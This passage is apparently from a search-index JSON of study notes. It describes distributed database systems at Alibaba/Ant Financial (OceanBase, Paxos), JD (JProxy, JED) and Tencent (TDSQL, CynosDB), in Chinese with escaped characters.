\u591a\u4ef6\u5546\u54c1\uff0c\u5b83\u5c31\u8981\u8fdb\u53bb\u4e00\u6761\u6761\u7684\u53d6\u51fa\u6765\u770b\u3002\u672c\u8d28\u4e0a\u6765\u8bb2\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u4e00\u767e\u591a\u6b21\u7684\u968f\u673a IO\u3002\u90a3\u4e48\u5f53\u5f88\u591a\u4eba\u540c\u65f6\u6765\u770b\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u4e00\u4e2a IO \u5c31\u88ab\u653e\u5927\u4e86\u51e0\u767e\u500d\uff0c\u8fd9\u65f6\u5019\u6709\u591a\u5c11\u4e2a\u786c\u76d8\u90fd\u4e0d\u591f\u7528\u3002 \u89e3\u51b3\u65b9\u6848\uff1a\u7269\u5316\u89c6\u56fe \u5148\u628a\u6bcf\u4e2a\u7528\u6237\u6536\u85cf\u7684\u4fe1\u606f\u805a\u96c6\u8d77\u6765\uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11 IO\uff0c\u7136\u540e\u628a\u6536\u85cf\u7684\u5546\u54c1\u653e\u5728\u8fd9\u4e2a\u5217\u8868\u91cc\u3002\u4f46\u662f\u6211\u4eec\u600e\u4e48\u907f\u514d\u53bb\u8bbf\u95ee\u4e00\u767e\u591a\u6b21 IO \u5462\uff1f\u6211\u4eec\u7684\u529e\u6cd5\u5c31\u662f\u627e\u5230\u4e00\u4e2a\u65f6\u95f4\u70b9\uff0c\u5f53\u65f6\u662f\u8bbe\u5b9a\u5728\u6bcf\u5929\u665a\u4e0a\u51cc\u6668\u4e24\u70b9\u3002\u5728\u8fd9\u4e4b\u524d\uff0c\u6211\u4eec\u5c31\u628a\u8fd9\u4e9b\u4fe1\u606f\u5168\u90e8 merge \u5230\u786c\u76d8\uff0c\u7136\u540e\u4ece\u4e24\u70b9\u5f00\u59cb\uff0c\u6211\u4eec\u628a\u65b0\u7684\u4fee\u6539\u90fd\u653e\u5728\u5185\u5b58\u91cc\u9762\u3002 \u6240\u4ee5\u6bcf\u5230\u4e24\u70b9\u7684\u65f6\u5019\uff0c\u6211\u4eec\u628a\u4e24\u70b9\u4e4b\u524d\u6240\u6709\u7684\u4fe1\u606f\u90fd\u5408\u5230\u8fd9\u5f20\u8868\u91cc\uff0c\u90a3\u4e48\u8fd9\u5f20\u8868\u91cc\u7684\u4fe1\u606f\u5728\u4e24\u70b9\u6574\u7684\u65f6\u5019\u662f\u51c6\u786e\u7684\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u4e0d\u9700\u8981\u53bb\u8bbf\u95ee\u5546\u54c1\u5e93\u3002\u4e24\u70b9\u4e4b\u540e\u7684\u4fee\u6539\uff0c\u5305\u62ec\u5546\u54c1\u5e93\u7684\u4fee\u6539\u662f\u5728\u5185\u5b58\u91cc\u8fdb\u884c\u7684\uff0c\u8fd9\u65f6\u5019\u5982\u679c\u8981\u770b\u8fd9\u4e9b\u5546\u54c1\u6709\u54ea\u4e9b\u4fee\u6539\uff0c\u5546\u54c1\u53ea\u9700\u8bbf\u95ee\u5185\u5b58\u4e2d\u7684\u66f4\u65b0\u5373\u53ef\u3002 \u6240\u4ee5\u5176\u5b9e\u6211\u4eec\u5c31\u662f\u901a\u8fc7\u8fd9\u6837\u4e00\u4e2a\u624b\u6bb5\uff0c\u628a\u6bcf\u6b21\u6536\u85cf\u5939\u7684\u5c55\u793a\uff0c\u7531\u539f\u6765\u7684\u4e00\u767e\u591a\u6b21 IO \u53d8\u6210\u4e86\u4e00\u6b21\u3002\u6211\u4eec\u4e00\u4e0b\u5b50\u5c31\u628a\u6dd8\u5b9d\u6536\u85cf\u5939\u4e1a\u52a1\u7684\u6574\u4e2a IO \u964d\u4e0b\u6765\u4e86\u3002 Paxos\u534f\u8bae \u00b6 \u6bcf\u4e00\u7b14\u4e8b\u52a1\uff0c\u4e3b\u5e93\u6267\u884c\u5b8c\u6210\u540e\uff0c\u8981\u540c\u6b65\u5230\u534a\u6570\u4ee5\u4e0a\u5e93(\u5305\u62ec\u4e3b\u5e93\u81ea\u8eab)\uff0c\u4f8b\u59823\u4e2a\u5e93\u4e2d\u76842\u4e2a\u5e93\uff0c\u6216\u80055\u4e2a\u5e93\u4e2d\u76843\u4e2a\u5e93\uff0c\u4e8b\u52a1\u624d\u6210\u529f\u3002\u8fd9\u6837\uff0c\u5c11\u6570\u5e93(\u4f8b\u59823\u4e2a\u5e93\u4e2d\u76841\u4e2a\u5e93\uff0c\u6216\u80055\u4e2a\u5e93\u4e2d\u76842\u4e2a\u5e93)\u5f02\u5e38\u540e\u4e1a\u52a1\u5e76\u4e0d\u53d7\u5f71\u54cd\uff1a \u4eac\u4e1c\u2014\u2014JProxy \u00b6 \u53d1\u5c55\u8fc7\u7a0b \u00b6 \u65e9\u671f\u7248\u672c \u00b6 \u6bcf\u4e2aJProxy\u90fd\u4f1a\u6709\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u914d\u7f6e\u76f8\u5e94\u4e1a\u52a1\u7684\u5e93\u8868\u62c6\u5206\u4fe1\u606f\u53ca\u8def\u7531\u4fe1\u606f\uff0c JProxy\u63a5\u6536\u5230SQL\u4ee5\u540e\u4f1a\u5bf9SQL\u8fdb\u884c\u89e3\u6790\u518d\u6839\u636e\u8def\u7531\u4fe1\u606f\u51b3\u5b9aSQL\u662f\u5426\u9700\u8981\u91cd\u5199\u53ca\u8be5\u53d1\u5f80\u54ea\u4e9b\u8282\u70b9\uff0c\u7b49\u5404\u8282\u70b9\u7ed3\u679c\u8fd4\u56de\u4ee5\u540e\u518d\u5c06\u7ed3\u679c\u6c47\u603b\u6309\u7167MySQL\u4f20\u8f93\u534f\u8bae\u8fd4\u56de\u7ed9\u5e94\u7528\u3002 \u968f\u7740\u914d\u7f6e\u6587\u4ef6\u7684\u589e\u591a\uff0c\u53c8\u5f15\u5165\u4e86 JManager \u6a21\u5757\uff0c\u8fd9\u4e2a\u6a21\u5757\u8d1f\u8d23\u7684\u5de5\u4f5c\u662f\u7ba1\u7406\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u8def\u7531\u5143\u4fe1\u606f\u3002\u8fd9\u6837\uff0cJProxy\u7684\u8def\u7531\u5143\u4fe1\u606f\u90fd\u662f\u901a\u8fc7JManager\u6765\u7edf\u4e00\u83b7\u53d6\uff0c\u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7JManager\u5f80\u5143\u6570\u636e\u5e93\u91cc\u6dfb\u52a0\u4fee\u6539\u8def\u7531\u5143\u6570\u636e\uff0c\u64cd\u4f5c\u5b8c\u6210\u4ee5\u540e\u901a\u77e5\u5404\u4e2aJProxy\u52a8\u6001\u52a0\u8f7d\u8def\u7531\u4fe1\u606f\u5c31\u53ef\u4ee5\u4fdd\u8bc1\u6bcf\u4e2aJProxy\u7684\u8def\u7531\u4fe1\u606f\u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u4ece\u800c\u89e3\u51b3\u7ef4\u62a4\u8def\u7531\u5143\u4fe1\u606f\u4e00\u81f4\u6027\u7684\u75db\u70b9\u3002 \u6269\u5bb9\u89e3\u51b3\u65b9\u6848\u2014\u2014\u5f15\u5165 JTransfer \u6a21\u5757 \u4f18\u5316SQL\u67e5\u8be2\u2014\u2014JMonitor \u5347\u7ea7\u5230\u5f39\u6027\u6570\u636e\u5e93 \u00b6 \u4eac\u4e1c\u5f39\u6027\u6570\u636e\u5e93\u662f\u4e00\u4e2a\u4ea7\u54c1\u7cfb\u5217\uff0c\u4e3b\u8981\u662f\u89e3\u51b3\u6570\u636e\u5e93\u7684\u8fd0\u7ef4\u3001\u4f7f\u7528\u548c\u7814\u53d1\u8fc7\u7a0b\u4e2d\u7684\u95ee\u9898\uff0c\u5177\u5907\u52a8\u6001\u4f38\u7f29\u3001\u9ad8\u53ef\u7528\u3001\u67e5\u8be2\u900f\u660e\u8def\u7531\u3001\u96c6\u7fa4\u5316\u65e5\u5fd7\u670d\u52a1\u548c\u81ea\u52a8\u5316\u8fd0\u7ef4\u7b49\u529f\u80fd\u3002 \u4e09\u4e2a\u529f\u80fd\u6a21\u5757\uff1a JED \u00b6 JED\u662fJProxy\u529f\u80fd\u7684\u7236\u96c6\uff0c\u5b83\u9664\u4e86\u5177\u5907\u900f\u660e\u8def\u7531\u3001\u7edf\u4e00\u5206\u5e93\u5206\u8868\u6807\u51c6\u4e4b\u5916\uff0c\u8fd8\u63d0\u4f9b\u4e86\u4e94\u5927\u529f\u80fd\uff1a BinLake \u00b6 BinLake\u53ea\u505a\u4e00\u6837\u5de5\u4f5c\uff1a\u96c6\u7fa4\u5316Binlog\u7684\u91c7\u96c6\u548c\u8ba2\u9605\u670d\u52a1\u3002 DBS \u00b6 DBS\u4e3b\u8981\u5b8c\u6210\u81ea\u52a8\u5316\u8fd0\u7ef4\u7684\u5de5\u4f5c\u3002\u5b83\u53ef\u4ee5\u5b8c\u6210\u6570\u636e\u5e93\u670d\u52a1\u7684\u81ea\u52a8\u5316\u4ea4\u4ed8\u3001\u6570\u636e\u5e93\u64cd\u4f5c\u7684\u6d41\u7a0b\u5316\u7ba1\u7406\u3001\u6570\u636e\u5e93\u5065\u5eb7\u6307\u6570\u5168\u9762\u76d1\u63a7\u3001\u6570\u636e\u5e93\u81ea\u52a8\u5907\u4efd\u53ca\u7ed3\u8f6c\uff0c\u4ee5\u53ca\u8c03\u5ea6\u4f5c\u4e1a\u7684\u591a\u6837\u5316\u8c03\u5ea6\uff08\u5305\u62ec\u5b9a\u65f6\u3001\u4f9d\u8d56\u4ee5\u53ca\u89e6\u53d1\u4e09\u79cd\u8c03\u5ea6\u6a21\u5f0f\uff09\u3002 \u817e\u8baf\u2014\u2014TDSQL \u00b6 \u53d1\u5c55\u5386\u7a0b \u00b6 \u817e\u8baf\u4e0d\u540c\u4e8e\u4e0a\u8ff0\u4e24\u5bb6\u4e92\u8054\u7f51\u4f01\u4e1a\uff0c\u5185\u90e8\u5e76\u6ca1\u6709\u53bbIOE\u7684\u8fc7\u7a0b\uff0c\u4e3b\u8981\u7684\u53d1\u5c55\u5386\u7a0b\u5982\u4e0b\uff1a \u8fce\u63a5\u5f00\u6e90 \u00b6 \u4e00\u5f00\u59cb\uff0c\u817e\u8baf\u4e91\u6570\u636e\u5e93\u5efa\u8bbe\u4e3b\u8981\u5f15\u5165\u4e86\u5f53\u65f6\u4e1a\u754c\u8f83\u4e3a\u4e3b\u6d41\u7684\u5f00\u6e90\u6570\u636e\u5e93\uff0c\u5982 MySQL\uff0cRedis\uff0cPostgreSQL \u7b49\u3002\u968f\u540e\u9488\u5bf9\u4e91\u4e0a\u5ba2\u6237\u5b9a\u5236\u9700\u6c42\uff0c\u817e\u8baf\u4e91\u5728\u6570\u636e\u5e93\u4e2d\u884d\u751f\u7814\u53d1\u4e86\u5982\u6570\u636e\u5e93\u5e76\u884c\u590d\u5236\u3001\u5ba1\u8ba1\u65e5\u5fd7\u3001\u5728\u7ebf\u52a0\u5b57\u6bb5\u7b49\u6838\u5fc3\u529f\u80fd\uff0c\u5e76\u8ba1\u5212\u9010\u6b65\u5c06\u4ee5\u4e0a\u529f\u80fd\u56de\u9988\u7ed9 MariaDB \u548c MySQL \u793e\u533a\u3002 \u5185\u90e8\u81ea\u7814 \u00b6 \u5bf9\u4e8e\u817e\u8baf\u4e91\u81ea\u7814\u7684\u6570\u636e\u5e93\uff0c\u4e3b\u8981\u5206\u4e3a\u4e24\u7c7b\uff0c\u4e00\u7c7b\u662f \u4e3a\u817e\u8baf\u5185\u90e8\u4e1a\u52a1\u9002\u914d\u800c\u751f\u7684\u81ea\u7814\u6570\u636e\u5e93 \uff0c\u5178\u578b\u4ee3\u8868\u662f TDSQL\u3002\u53e6\u4e00\u7c7b\u662f\u57fa\u4e8e\u670d\u52a1\u6d77\u91cf\u5ba2\u6237\uff0c\u7531\u5f00\u6e90\u6570\u636e\u5e93\u9002\u914d\u4e1a\u52a1\u81ea\u4e3b\u7814\u53d1\u7684\u6570\u636e\u5e93\uff0c\u6bd4\u5982\u4f01\u4e1a\u7ea7\u4e91\u539f\u751f\u6570\u636e\u5e93 CynosDB\u3002\u5982\u679c\u8bf4\u8282\u7701\u8fd0\u7ef4\u4ee5\u53ca\u4eba\u529b\u6210\u672c\u662f\u4e91\u6570\u636e\u5e93 1.0 \u65f6\u4ee3\u7684\u7279\u5f81\uff0c\u5230\u4e86 2.0 \u65f6\u4ee3\uff0c\u4e91\u6570\u636e\u5e93\u8981\u5728\u6839\u672c\u4e0a\u5177\u5907\u81ea\u5efa\u6570\u636e\u5e93\u65e0\u6cd5\u6bd4\u62df\u7684\u4f18\u52bf\uff0c\u624d\u80fd\u6210\u4e3a\u652f\u6301\u7528\u6237\u4e1a\u52a1\u8fd0\u8f6c\u4e0d\u53ef\u64bc\u52a8\u7684\u57fa\u77f3\u3002 TDSQL\u67b6\u6784 \u00b6 \u6574\u4f53\u6765\u8bf4\uff0cTDSQL \u662f\u7531\u51b3\u7b56\u8c03\u5ea6\u96c6\u7fa4 /GTM\uff0cSQLEngine\u3001\u6570\u636e\u5b58\u50a8\u5c42\u7b49\u6838\u5fc3\u7ec4\u4ef6\u7ec4\u6210\uff0c\u5176\u6bcf\u4e2a\u6a21\u5757\u90fd\u57fa\u4e8e\u5206\u5e03\u5f0f\u67b6\u6784\u8bbe\u8ba1\uff0c\u53ef\u4ee5\u5b9e\u73b0\u5feb\u901f\u6269\u5c55\uff0c\u65e0\u7f1d\u5207\u6362\uff0c\u5b9e\u65f6\u6545\u969c\u6062\u590d\u7b49 \u57fa\u4e8e\u89c4\u5219\u548c\u57fa\u4e8e\u4ee3\u4ef7\u7684\u67e5\u8be2\u5f15\u64ce \u00b6 TDSQL \u5728 SQLENGINE \u5b9e\u73b0\u4e86\u57fa\u4e8e\u4ee3\u4ef7\u7684\u67e5\u8be2\u5f15\u64ce (CBO)\uff0cSQL \u7ecf\u8fc7 SQLENGINE \u7684\u8bcd\u6cd5\u3001\u8bed\u6cd5\u89e3\u6790\u3001\u8bed\u4e49\u5206\u6790\u548c SQL \u4f18\u5316\u4e4b\u540e\uff0c\u4f1a\u751f\u6210\u5206\u5e03\u5f0f\u7684\u67e5\u8be2\u8ba1\u5212\uff0c\u5e76\u6839\u636e\u6570\u636e\u8def\u7531\u7b56\u7565\uff08\u57fa\u4e8e\u4ee3\u4ef7\u7684\u67e5\u8be2\u5f15\u64ce\uff09\u8fdb\u884c\u4e0b\u63a8\u8ba1\u7b97\uff0c\u6700\u540e\u5bf9\u6c47\u603b\u7684\u6570\u636e\u8fd4\u56de\u7ed9\u524d\u7aef\u3002 CynosDB \u00b6 2017\u5e74\u817e\u8baf\u4e91\u81ea\u4e3b\u7814\u53d1\u4e86\u4e00\u6b3e\u771f\u6b63\u7684\u4e91\u539f\u751f\u6570\u636e\u5e93CynosDB \u8bbe\u8ba1\u601d\u8def\uff1a \u5148\u662f\u8ba1\u7b97\u5b58\u50a8\u5206\u79bb\uff0c\u6bd4\u5982\u628a\u8fd0\u7b97 CPU \u6216\u8005\u5185\u5b58\u653e\u5728\u4e00\u8d77\u7edf\u4e00\u5206\u914d\uff0c\u53ef\u4ee5\u83b7\u5f97\u5f39\u6027\u8c03\u5ea6\u80fd\u529b\u3002 \u7b2c\u4e8c\u4e2a\u662f\u65e5\u5fd7\u4e0b\u6c89\u53ca\u5f02\u6b65\u56de\u653e\uff0c\u540c\u65f6\u79fb\u9664\u4e86\u6570\u636e\u9875\u9762\u7684\u5237\u810f\u903b\u8f91\uff0c\u8fd9\u6837\u964d\u4f4e\u4e86\u8ba1\u7b97\u5b58\u50a8\u5206\u79bb\u7684\u67b6\u6784\u4e0b\u7684\u7f51\u7edc\u5f00\u9500\u3002 \u7b2c\u4e09\u4e2a\u662f\u5206\u5e03\u5f0f\u5b58\u50a8\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u817e\u8baf\u4e91\u81ea\u7814\u7684\u5206\u5e03\u5b58\u50a8\u7cfb\u7edf\uff0c\u5171\u4eab\u7684\u5206\u5e03\u5f0f\u5b58\u50a8\u53ef\u4ee5\u6a2a\u5411\u6269\u5c55\u3002 \u7b2c\u56db\u4e2a\u662f\u540e\u53f0\u7684\u6301\u7eed\u65e5\u5fd7\u5907\u4efd\uff0c\u4f20\u7edf\u6570\u636e\u5e93\u7684\u5907\u4efd\u662f\u5728\u6570\u636e\u5e93\u4e3b\u673a\u4e0a\u53bb\u62f7\u65e5\u5fd7\u5b8c\u6210\u5907\u4efd\uff0c\u800c CynosDB \u7684\u6301\u7eed\u5907\u4efd\u662f\u5728\u5b58\u50a8\u4e0a\u8fdb\u884c\uff0c\u4e0d\u5e72\u6270\u6570\u636e\u5e93\u5b9e\u4f8b\uff0c\u51cf\u8f7b\u7531\u4e8e\u5907\u4efd\u5bf9\u6570\u636e\u5e93\u7684\u51b2\u51fb\uff0c\u5e76\u4e14\u7528\u6237\u4e0d\u5fc5\u5173\u5fc3\u5907\u4efd\u7b56\u7565\u548c\u5907\u4efd\u5b58\u50a8\u8d44\u6e90\u89c4\u5212\u3002 \u53c2\u8003 \u00b6 \u963f\u91cc\u6280\u672f\u5206\u4eab\uff1a\u963f\u91cc\u81ea\u7814\u91d1\u878d\u7ea7\u6570\u636e\u5e93OceanBase\u7684\u8270\u8f9b\u6210\u957f\u4e4b\u8def \u4eac\u4e1c\u5206\u5e03\u5f0f\u6570\u636e\u5e93\u7cfb\u7edf\u6f14\u8fdb\u4e4b\u8def \u6df1\u5ea6\u63ed\u79d8\u817e\u8baf\u4e91\u6570\u636e\u5e93\u6280\u672f 7 \u5e74\u53d8\u8fc1\u53f2","title":"\u817e\u8baf\uff0c\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#_1","text":"","title":"\u817e\u8baf\uff0c\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#oceanbase","text":"\u662f\u963f\u91cc\u5df4\u5df4\u96c6\u56e2\u81ea\u4e3b\u7814\u53d1\u7684\u5206\u5e03\u5f0f \u5173\u7cfb\u578b\u6570\u636e\u5e93 \uff0c\u878d\u5408\u4f20\u7edf\u5173\u7cfb\u578b\u6570\u636e\u5e93\u5f3a\u5927\u529f\u80fd\u4e0e\u5206\u5e03\u5f0f\u7cfb\u7edf\u7684\u7279\u70b9\uff0c\u5177\u5907\u6301\u7eed\u53ef\u7528\u3001\u9ad8\u5ea6\u53ef\u6269\u5c55\u3001\u9ad8\u6027\u80fd\u7b49\u4f18\u52bf\u3002\u5e7f\u6cdb\u5e94\u7528\u4e8e\u8682\u8681\u91d1\u670d\u3001\u7f51\u5546\u94f6\u884c\u7b49\u91d1\u878d\u7ea7\u6838\u5fc3\u7cfb\u7edf\u3002 \u57282015\u5e74\u53cc11\u627f\u8f7d\u4e86\u8682\u8681\u6838\u5fc3\u94fe\u8def100%\u7684\u6d41\u91cf\uff0c\u521b\u4e0b\u4e86\u4ea4\u6613\u3001\u652f\u4ed8\u6bcf\u79d2\u652f\u4ed8\u5cf0\u503c\u7684\u65b0\u7eaa\u5f55\uff0c\u5728\u529f\u80fd\u3001\u7a33\u5b9a\u6027\u3001\u53ef\u6269\u5c55\u6027\u3001\u6027\u80fd\u65b9\u9762\u90fd\u7ecf\u5386\u8fc7\u4e25\u683c\u7684\u68c0\u9a8c\u3002","title":"\u8682\u8681\u91d1\u670d\u2014\u2014OceanBase"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#_2","text":"","title":"\u53d1\u5c55\u8fc7\u7a0b"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#_3","text":"\u5206\u5e03\u5f0f \u53ef\u9760\u6027\u597d","title":"\u7279\u70b9\uff1a"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#_4","text":"\u6bcf\u4e2a\u4eba\u90fd\u7528\u8fc7\u6dd8\u5b9d\u6536\u85cf\u5939\uff0c\u6bcf\u6b21\u4f60\u6253\u5f00\u6536\u85cf\u5939\u7684\u65f6\u5019\uff0c\u6570\u636e\u5e93\u5728\u80cc\u540e\u5176\u5b9e\u505a\u4e86\u5f88\u591a\u4e8b\u60c5\uff1a\u6211\u4eec\u4ee5\u5355\u4e2a\u5546\u54c1\u4e3a\u4f8b\uff0c\u5b83\u9700\u8981\u5230\u4e00\u4e2a\u53eb\u5546\u54c1\u5e93\u7684\u5730\u65b9\uff0c\u9010\u6761\u7eaa\u5f55\u6838\u5bf9\uff0c\u770b\u770b\u5546\u54c1\u6709\u6ca1\u6709\u4e0b\u67b6\uff0c\u6709\u6ca1\u6709\u53c2\u4e0e\u4fc3\u9500\uff0c\u6709\u6ca1\u6709\u53c2\u52a0\u5176\u4ed6\u7684\u8fd4\u70b9\u6d3b\u52a8\u7b49\u7b49\u3002\u5047\u5982\u4f60\u6536\u85cf\u4e86 100 \u591a\u4ef6\u5546\u54c1\uff0c\u5b83\u5c31\u8981\u8fdb\u53bb\u4e00\u6761\u6761\u7684\u53d6\u51fa\u6765\u770b\u3002\u672c\u8d28\u4e0a\u6765\u8bb2\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u4e00\u767e\u591a\u6b21\u7684\u968f\u673a IO\u3002\u90a3\u4e48\u5f53\u5f88\u591a\u4eba\u540c\u65f6\u6765\u770b\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u4e00\u4e2a IO \u5c31\u88ab\u653e\u5927\u4e86\u51e0\u767e\u500d\uff0c\u8fd9\u65f6\u5019\u6709\u591a\u5c11\u4e2a\u786c\u76d8\u90fd\u4e0d\u591f\u7528\u3002 \u89e3\u51b3\u65b9\u6848\uff1a\u7269\u5316\u89c6\u56fe \u5148\u628a\u6bcf\u4e2a\u7528\u6237\u6536\u85cf\u7684\u4fe1\u606f\u805a\u96c6\u8d77\u6765\uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11 IO\uff0c\u7136\u540e\u628a\u6536\u85cf\u7684\u5546\u54c1\u653e\u5728\u8fd9\u4e2a\u5217\u8868\u91cc\u3002\u4f46\u662f\u6211\u4eec\u600e\u4e48\u907f\u514d\u53bb\u8bbf\u95ee\u4e00\u767e\u591a\u6b21 IO \u5462\uff1f\u6211\u4eec\u7684\u529e\u6cd5\u5c31\u662f\u627e\u5230\u4e00\u4e2a\u65f6\u95f4\u70b9\uff0c\u5f53\u65f6\u662f\u8bbe\u5b9a\u5728\u6bcf\u5929\u665a\u4e0a\u51cc\u6668\u4e24\u70b9\u3002\u5728\u8fd9\u4e4b\u524d\uff0c\u6211\u4eec\u5c31\u628a\u8fd9\u4e9b\u4fe1\u606f\u5168\u90e8 merge \u5230\u786c\u76d8\uff0c\u7136\u540e\u4ece\u4e24\u70b9\u5f00\u59cb\uff0c\u6211\u4eec\u628a\u65b0\u7684\u4fee\u6539\u90fd\u653e\u5728\u5185\u5b58\u91cc\u9762\u3002 \u6240\u4ee5\u6bcf\u5230\u4e24\u70b9\u7684\u65f6\u5019\uff0c\u6211\u4eec\u628a\u4e24\u70b9\u4e4b\u524d\u6240\u6709\u7684\u4fe1\u606f\u90fd\u5408\u5230\u8fd9\u5f20\u8868\u91cc\uff0c\u90a3\u4e48\u8fd9\u5f20\u8868\u91cc\u7684\u4fe1\u606f\u5728\u4e24\u70b9\u6574\u7684\u65f6\u5019\u662f\u51c6\u786e\u7684\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u4e0d\u9700\u8981\u53bb\u8bbf\u95ee\u5546\u54c1\u5e93\u3002\u4e24\u70b9\u4e4b\u540e\u7684\u4fee\u6539\uff0c\u5305\u62ec\u5546\u54c1\u5e93\u7684\u4fee\u6539\u662f\u5728\u5185\u5b58\u91cc\u8fdb\u884c\u7684\uff0c\u8fd9\u65f6\u5019\u5982\u679c\u8981\u770b\u8fd9\u4e9b\u5546\u54c1\u6709\u54ea\u4e9b\u4fee\u6539\uff0c\u5546\u54c1\u53ea\u9700\u8bbf\u95ee\u5185\u5b58\u4e2d\u7684\u66f4\u65b0\u5373\u53ef\u3002 \u6240\u4ee5\u5176\u5b9e\u6211\u4eec\u5c31\u662f\u901a\u8fc7\u8fd9\u6837\u4e00\u4e2a\u624b\u6bb5\uff0c\u628a\u6bcf\u6b21\u6536\u85cf\u5939\u7684\u5c55\u793a\uff0c\u7531\u539f\u6765\u7684\u4e00\u767e\u591a\u6b21 IO \u53d8\u6210\u4e86\u4e00\u6b21\u3002\u6211\u4eec\u4e00\u4e0b\u5b50\u5c31\u628a\u6dd8\u5b9d\u6536\u85cf\u5939\u4e1a\u52a1\u7684\u6574\u4e2a IO \u964d\u4e0b\u6765\u4e86\u3002","title":"\u4e1a\u52a1\u521b\u65b0\u2014\u2014\u6dd8\u5b9d\u6536\u85cf\u5939"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#paxos","text":"\u6bcf\u4e00\u7b14\u4e8b\u52a1\uff0c\u4e3b\u5e93\u6267\u884c\u5b8c\u6210\u540e\uff0c\u8981\u540c\u6b65\u5230\u534a\u6570\u4ee5\u4e0a\u5e93(\u5305\u62ec\u4e3b\u5e93\u81ea\u8eab)\uff0c\u4f8b\u59823\u4e2a\u5e93\u4e2d\u76842\u4e2a\u5e93\uff0c\u6216\u80055\u4e2a\u5e93\u4e2d\u76843\u4e2a\u5e93\uff0c\u4e8b\u52a1\u624d\u6210\u529f\u3002\u8fd9\u6837\uff0c\u5c11\u6570\u5e93(\u4f8b\u59823\u4e2a\u5e93\u4e2d\u76841\u4e2a\u5e93\uff0c\u6216\u80055\u4e2a\u5e93\u4e2d\u76842\u4e2a\u5e93)\u5f02\u5e38\u540e\u4e1a\u52a1\u5e76\u4e0d\u53d7\u5f71\u54cd\uff1a","title":"Paxos\u534f\u8bae"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#jproxy","text":"","title":"\u4eac\u4e1c\u2014\u2014JProxy"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#_5","text":"","title":"\u53d1\u5c55\u8fc7\u7a0b"},{"location":"2019\u5b66\u671f/database/\u817e\u8baf\u8682\u8681\u91d1\u670d\u4eac\u4e1c\u4f7f\u7528\u7684\u6570\u636e\u5e93/#_6","text":"\u6bcf\u4e2aJProxy\u90fd\u4f1a\u6709\u4e00\u4e2a\u914d\u7f6e\u6587\u4ef6\uff0c\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u914d\u7f6e\u76f8\u5e94\u4e1a\u52a1\u7684\u5e93\u8868\u62c6\u5206\u4fe1\u606f\u53ca\u8def\u7531\u4fe1\u606f\uff0c JProxy\u63a5\u6536\u5230SQL\u4ee5\u540e\u4f1a\u5bf9SQL\u8fdb\u884c\u89e3\u6790\u518d\u6839\u636e\u8def\u7531\u4fe1\u606f\u51b3\u5b9aSQL\u662f\u5426\u9700\u8981\u91cd\u5199\u53ca\u8be5\u53d1\u5f80\u54ea\u4e9b\u8282\u70b9\uff0c\u7b49\u5404\u8282\u70b9\u7ed3\u679c\u8fd4\u56de\u4ee5\u540e\u518d\u5c06\u7ed3\u679c\u6c47\u603b\u6309\u7167MySQL\u4f20\u8f93\u534f\u8bae\u8fd4\u56de\u7ed9\u5e94\u7528\u3002 \u968f\u7740\u914d\u7f6e\u6587\u4ef6\u7684\u589e\u591a\uff0c\u53c8\u5f15\u5165\u4e86 JManager \u6a21\u5757\uff0c\u8fd9\u4e2a\u6a21\u5757\u8d1f\u8d23\u7684\u5de5\u4f5c\u662f\u7ba1\u7406\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u8def\u7531\u5143\u4fe1\u606f\u3002\u8fd9\u6837\uff0cJProxy\u7684\u8def\u7531\u5143\u4fe1\u606f\u90fd\u662f\u901a\u8fc7JManager\u6765\u7edf\u4e00\u83b7\u53d6\uff0c\u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7JManager\u5f80\u5143\u6570\u636e\u5e93\u91cc\u6dfb\u52a0\u4fee\u6539\u8def\u7531\u5143\u6570\u636e\uff0c\u64cd\u4f5c\u5b8c\u6210\u4ee5\u540e\u901a\u77e5\u5404\u4e2aJProxy\u52a8\u6001\u52a0\u8f7d\u8def\u7531\u4fe1\u606f\u5c31\u53ef\u4ee5\u4fdd\u8bc1\u6bcf\u4e2aJProxy\u7684\u8def\u7531\u4fe1\u606f\u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u4ece\u800c\u89e3\u51b3\u7ef4\u62a4\u8def\u7531\u5143\u4fe1\u606f\u4e00\u81f4\u6027\u7684\u75db\u70b9\u3002 